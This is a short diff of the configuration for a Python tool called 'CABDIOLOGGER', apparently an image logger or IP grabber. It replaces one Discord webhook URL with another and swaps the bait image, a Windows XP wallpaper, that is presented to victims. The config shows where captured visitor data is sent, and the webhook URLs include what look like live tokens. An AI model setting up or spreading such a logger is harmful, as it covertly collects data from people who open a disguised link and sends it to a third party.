@@ -11,8 +11,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1453383909701062843/5nPgnZZuM6h_4pdyThUYhVKxjWk9QQRwE3njqGhFjk9YNv3jVbM9TkOnU6WtTL8bf7Ef",
-    "image": "https://ih1.redbubble.net/image.3713143085.1244/raf,360x360,075,t,fafafa:ca443f4786.jpg", 
+    "webhook": "https://discord.com/api/webhooks/1453389497940181116/q1Zu_G9IEOH04KlNjbx0CA4OqeI9lxu25-D2nfl8GsYqElMNBXEJy7TFGO-m5tRvEwKL",
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
